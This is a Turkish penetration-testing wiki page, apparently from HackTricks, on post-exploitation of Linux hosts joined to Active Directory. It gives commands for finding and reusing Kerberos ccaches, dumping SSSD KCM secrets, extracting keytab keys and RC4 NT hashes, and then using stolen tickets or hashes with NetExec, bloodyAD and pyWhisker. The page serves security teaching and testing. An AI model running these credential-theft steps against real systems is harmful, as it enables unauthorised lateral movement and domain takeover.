# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir Linux makinesi, Active Directory ortamında da bulunabilir.

AD içindeki bir Linux makinesi **Kerberos materyallerini yerel olarak depolayabilir**: kullanıcı ccache'leri, makine/hizmet keytab'leri ve SSSD tarafından yönetilen sırlar. Bu artefaktlar genellikle diğer Kerberos kimlik bilgileri gibi yeniden kullanılabilir. Bunların çoğunu okuyabilmek için biletin sahibi olan kullanıcı veya makinede **root** olmanız gerekir.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Keşif

### Linux üzerinden AD keşfi

Linux'ta (veya Windows'taki bash'te) bir AD'ye erişiminiz varsa, AD'yi keşfetmek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) aracını deneyebilirsiniz.

**Linux üzerinden AD'yi keşfetmenin diğer yollarını** öğrenmek için şu sayfaya da göz atabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, özellikle **Unix** ortamlarına yönelik, Microsoft Windows **Active Directory**'ye açık kaynaklı bir **alternatiftir**. Active Directory'ye benzer yönetim özellikleri için eksiksiz bir **LDAP dizinini**, MIT **Kerberos** Anahtar Dağıtım Merkezi ile birleştirir. CA ve RA sertifika yönetimi için Dogtag **Certificate System**'i kullanır ve akıllı kartlar da dahil olmak üzere **çok faktörlü** kimlik doğrulamayı destekler. SSSD, Unix kimlik doğrulama süreçleri için entegre edilmiştir.<sup>[[14]](#references)[[15]](#references)</sup> Daha fazla bilgi için:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Etki alanına katılmış ana makine artefaktları

Biletlere dokunmadan önce **ana makinenin AD'ye nasıl katıldığını** ve **Kerberos materyallerinin gerçekte nerede depolandığını** belirleyin. Modern Linux ana makinelerinde bu işlem genellikle yalnızca `/tmp` içindeki düz dosyalarla değil, `realmd` + `adcli` + `sssd` ile gerçekleştirilir.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Bu, ana makinenin AD'ye güvenip güvenmediğini, SSSD'nin kimlikleri veya ticket'ları önbelleğe alıp almadığını ve **machine/service keytab**'lerin veya **KCM secrets**'ların kötüye kullanım için mevcut olup olmadığını hızla gösterir.<sup>[[4]](#references)[[10]](#references)</sup>

`/var/lib/sss/db/cache_*.ldb` dosyalarını Kerberos ccache'lerinden ve `/var/lib/sss/secrets/secrets.ldb` dosyasından ayrı değerlendirin. Bir domain'de `cache_credentials = true` **ve** kullanıcı daha önce bu ana makinede kimlik doğrulaması yapmışsa, `cache_*.ldb` dosyaları çevrimdışı parola doğrulayıcıları içerebilir. Bu dosyalar normalde yalnızca ayrıcalıklı erişimle okunabilir. Bir önbellek dosyasının veya ayarın etkin olmasının tek başına kullanılabilir ve güncel bir parolanın kanıtı olmadığını unutmayın; bu sonuca varmadan önce domain başına geçerli ayarı ve gerçekten önbelleğe alınmış kimlikleri inceleyin. Bkz. [Red Hat's SSSD credential-cache documentation](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Linux ile AD arasındaki ayrı bir kimlik sınırı için [mixed-vendor Kerberos name mapping](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/), yalnızca bir hizmet ticket'ı kabul edip principal'ını ilgili Unix hesabına eşlediğinde önem taşır.

`ksu` bulunan bir ana makinede, geçerli bir Kerberos principal'ı root dâhil **yerel bir hedef hesaba** erişebilir; ancak bunun için hesabın ilgili principal'a izin vermesi gerekir. [MIT Kerberos documents](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html), hedef hesabın `.k5login` ve `.k5users` dosyalarını ve ikisi de yoksa kullanılan ad eşleme yöntemini açıklar. `.k5users`, `ksu -e` için komutları da kısıtlayabilir; yalnızca dosya adının varlığı shell erişimini kanıtlamaz. Hedef hesabı, dosya sahipliğini/izinlerini ve okunabilir yetkilendirme girdilerini, kullanılabilir Kerberos kimlik bilgisini ve geçerli eşleme kurallarını inceleyin. Root home dizinine erişilemiyorsa yetkilendirme durumu bilinmiyor demektir. Pasif enumeration, ticket istemeden veya `ksu` çalıştırmadan bu yolları ve izinleri listelemelidir.

Zamanlanmış bir yedekleme, `.k5login` yetkilendirme sınırını dolaylı olarak oluşturabilir. Daha yüksek ayrıcalıklı bir hesap, daha düşük ayrıcalıklı kullanıcının yazabildiği bir dizini kendi home dizinine özyinelemeli olarak kopyalıyorsa, kopyalamanın gizli dosyaları da içerdiğini, hedef yolun hesabın geçerli home dizini olduğunu ve ortaya çıkan dosyanın Kerberos login hizmetince kabul edilen sahipliğe sahip olduğunu doğrulayın. Örneğin [rsync documents](https://download.samba.org/pub/rsync/rsync.1.html), `-a --no-owner` seçeneğinin yeni hedef dosyaları alıcı kullanıcıya ait bıraktığını belirtir. [MIT Kerberos documents](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html), o kullanıcının `.k5login` dosyasındaki bir principal'ın erişime nasıl izin verebileceğini açıklar. Zamanlanmış işin RunAs kimliğini, kaynak yazma erişimini, geçerli rsync seçeneklerini, GSSAPI etkin login'i ve listelenen principal için geçerli bir ticket bulunduğunu doğrulayın; yazılabilir bir kaynak dizini veya zamanlanmış bir rsync komutu tek başına bu yolu kanıtlamaz.

Okunabilir bir keytab de principal özelinde incelenmelidir. Yönetici adını taşıyan bir principal içeren keytab, tek başına yönetici haklarının kanıtı değildir: [KDC's `kadm5.acl` policy](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html), izin verilen principal işlemlerini belirler. Keytab erişimini root'a giden bir yol olarak değerlendirmeden önce principal'ı, geçerli ACL'yi ve yerel `ksu` veya login yetkilendirmesini ayrı ayrı doğrulayın. Pasif inceleme, keytab yolunu ve izinlerini anahtarları kullanmadan veya KDC'ye bağlanmadan listeleyebilir.

## Ticket'larla oynama

### Pass The Ticket

Bu sayfada, bir Linux ana makinesinde **Kerberos ticket'larını bulabileceğiniz farklı konumları** bulacaksınız. Aşağıdaki sayfada bu CCache ticket formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve PTT saldırısını nasıl gerçekleştireceğinizi öğrenebilirsiniz:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux'a özgü ticket toplama iş akışlarını** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` vb.) arıyorsanız, özel sayfaya bakın:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp içinden CCACHE ticket'larını yeniden kullanma

CCACHE dosyaları, **Kerberos kimlik bilgilerini depolamak** için kullanılan ikili biçimlerdir. `FILE:/tmp/krb5cc_%{uid}` hâlâ yaygındır; ancak modern Linux kurulumlarında `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` veya `KCM:%{uid}` de kullanılır. Ticket'ların `/tmp` içinde bulunduğunu varsaymadan önce **`KRB5CCNAME`** ortam değişkenini ve `default_ccache_name` ayarını kontrol edin.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Keyring'den CCACHE ticket yeniden kullanımı

**Bir process'in belleğinde saklanan Kerberos ticket'ları çıkarılabilir**; özellikle makinenin ptrace koruması devre dışı bırakılmışsa (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaçla kullanılabilecek yararlı bir araç [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur. Araç, session'lara injection yapıp ticket'ları `/tmp` dizinine dökerek çıkarma işlemini kolaylaştırır.<sup>[[1]](#references)[[16]](#references)</sup>

Bu aracı yapılandırmak ve kullanmak için aşağıdaki adımlar izlenir:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Bu prosedür çeşitli oturumlara enjekte etmeyi dener ve çıkarılan ticket'ları `/tmp` dizinine `__krb_UID.ccache` adlandırma düzeniyle kaydederek başarılı olduğunu belirtir.<sup>[[1]](#references)</sup>

### SSSD KCM'den CCACHE ticket'ını yeniden kullanma

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` yolunda tutar. İlgili anahtar, `/var/lib/sss/secrets/.secrets.mkey` yolunda gizli bir dosya olarak saklanır. Varsayılan olarak anahtar yalnızca **root** izinlerine sahipseniz okunabilir.<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`** aracını --database ve --key parametreleriyle çağırmak, veritabanını ayrıştırıp **gizli bilgilerin şifresini çözer**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor ham Kerberos JSON payload'larını yazdırır; pass-the-cache/pass-the-ticket işlemlerinden önce bunları kullanılabilir bir ticket cache'e veya başka bir ticket formatına dönüştürün.<sup>[[4]](#references)</sup>

### Hızlı keytab triyajı

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### /etc/krb5.keytab dosyasından hesapları çıkarma

Root ayrıcalıklarıyla çalışan servisler için gerekli olan servis hesabı anahtarları, **`/etc/krb5.keytab`** dosyalarında güvenli şekilde saklanır. Servis parolalarına benzeyen bu anahtarların kesinlikle gizli tutulması gerekir.<sup>[[5]](#references)</sup>

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Linux'ta `klist -k -K -e`, principal'ları, anahtar sürüm numaralarını, şifreleme türlerini ve ham anahtar materyalini yazdırır. Anahtar türü **23 / RC4-HMAC** ise anahtar değeri aynı zamanda ilgili principal'ın **NT hash** değeridir.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Linux kullanıcıları için **`KeyTabExtract`**, NTLM hash reuse amacıyla kullanılabilecek RC4 HMAC hash'ini çıkarma işlevi sunar. Bunun yalnızca keytab hâlâ **etype 23 / RC4-HMAC** verisi içeriyorsa işe yaradığını unutmayın. **Yalnızca AES kullanılan** ortamlarda yeniden kullanılabilir bir NT hash elde edemeyebilirsiniz; ancak Kerberos aracılığıyla keytab ile doğrudan kimlik doğrulaması yapabilirsiniz.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

macOS'te **`bifrost`**, keytab dosyası analizi için bir araç görevi görür.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Çıkarılan hesap ve hash bilgileri kullanılarak **`NetExec`** gibi araçlarla sunuculara bağlantı kurulabilir.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### `/etc/krb5.keytab` içindeki makine hesabını yeniden kullanma

`realmd`/`adcli`/`sssd` ile etki alanına katılmış sistemlerde `/etc/krb5.keytab` genellikle **bilgisayar hesabını** ve bir veya daha fazla **host/service principal** içerir. **root** erişiminiz varsa, dosyanın içeriğini doğrudan dökmeyin: `klist -k` tarafından listelenen principal'lardan birini kullanarak TGT isteyin ve Linux host'un kendisi olarak işlem yapın.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Bu, özellikle **computer object**'in AD'de devredilmiş haklara sahip olduğu veya ana makinenin **gMSA** gibi başka sırları almasına izin verildiği durumlarda kullanışlıdır.<sup>[[13]](#references)</sup>

### Linux öncelikli AD araçlarıyla çalınan Kerberos materyalini yeniden kullanma

Geçerli bir `ccache` veya kullanılabilir bir keytab edindikten sonra, önce her şeyi Windows biçimlerine dönüştürmeden **doğrudan Linux'tan** AD üzerinde işlem yapabilirsiniz. Birçok modern araç, `KRB5CCNAME` / Kerberos kimlik doğrulamasını yerel olarak destekler.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Bu, **Linux post-exploitation** ile **AD object abuse** arasında iyi bir köprüdür. Nesne düzeyindeki abuse yollarının kendileri için şuraya bakın:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefact'ları

Güncel Linux dağıtımları, **Managed Service Accounts** hesaplarını doğrudan AD'den kullanabilir. Pratikte bu, bir Linux sunucusunu ele geçirdikten sonra yalnızca host keytab'ini değil, gMSA'den oluşturulmuş **hizmete özel keytab'leri** de bulabileceğiniz anlamına gelir. İncelenecek yaygın konumlar `/etc/gmsad.conf`, dağıtıma özel config dosyaları ve `/etc` altındaki ek `*.keytab` dosyalarıdır.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Bu, **herhangi bir Windows endpoint'e dokunmadan**, bu gMSA'ya bağlı SPN'ler için yeniden kullanılabilir bir Kerberos kimliği sağlar.<sup>[[13]](#references)</sup> AD'de daha yüksek ayrıcalıklar elde ettikten sonra **domain tarafındaki** gMSA/dMSA istismarını incelemek için:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Yönetilen hizmet hesabıyla AD'ye erişim – RHEL sistemlerini doğrudan Active Directory ile tümleştirme](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos ortam değişkenleri – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows tarafından kullanılan RC4-HMAC Kerberos şifreleme türleri](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos kullanımı | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domain'lerini keşfetme ve bunlara katılma | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD Kullanıcı Kılavuzu](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Hakkında | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 sürüm notları](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
